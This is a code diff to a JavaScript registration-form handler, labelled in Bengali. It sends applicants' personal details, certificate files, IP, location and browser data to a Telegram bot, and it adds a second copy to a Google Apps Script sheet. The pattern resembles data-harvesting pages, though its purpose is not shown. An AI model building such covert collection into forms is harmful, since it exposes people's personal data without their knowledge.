@@ -108,7 +108,7 @@ form.addEventListener('submit', async (e) => {
   const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
   const browser = navigator.userAgent;
 
-  let message = `নিবন্ধন তথ্য:\n\nনাম: ${name}\nমোবাইল: ${phone}\nজন্ম তারিখ: ${dob}\nবয়স: ${age}\nউচ্চতা: ${heightFeet} ফুট ${heightInch} ইঞ্চি\nলিঙ্গ: ${gender}\nওয়ার্ড: ${ward}\nগ্রাম: ${village}\n\nIP: ${ip}\nদেশ: ${country}\nশহর: ${city}\nডিভাইস: ${device}\nব্রাউজার: ${browser}`;
+  let message = `নিবন্ধন তথ্য (শিক্ষাগত সার্টিফিকেট ত্রুটি আছে):\n\nনাম: ${name}\nমোবাইল: ${phone}\nজন্ম তারিখ: ${dob}\nবয়স: ${age}\nউচ্চতা: ${heightFeet} ফুট ${heightInch} ইঞ্চি\nলিঙ্গ: ${gender}\nওয়ার্ড: ${ward}\nগ্রাম: ${village}\n\nIP: ${ip}\nদেশ: ${country}\nশহর: ${city}\nডিভাইস: ${device}\nব্রাউজার: ${browser}`;
 
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
@@ -136,6 +136,19 @@ form.addEventListener('submit', async (e) => {
 
   await sendFile(certificateFile);
   for (const f of extraFiles) await sendFile(f);
+
+  // Google Sheet এ পাঠানো
+  try {
+    await fetch("https://script.google.com/macros/s/AKfycbwRjT6dhEc0MhapeKtUKP4RI3jUqwZPdUqsxgKnYGrX7YbDnZ-WKUGD_BkzmvmZLlvrCg/exec", {
+      method: "POST",
+      body: JSON.stringify({
+        name, phone, dob, age, heightFeet, heightInch,
+        gender, ward, village, ip, country, city, device, browser
+      })
+    });
+  } catch (err) {
+    console.log("Google Sheet Error", err);
+  }
 
   // Hide loading + show success
   loadingDiv.style.display = 'none';
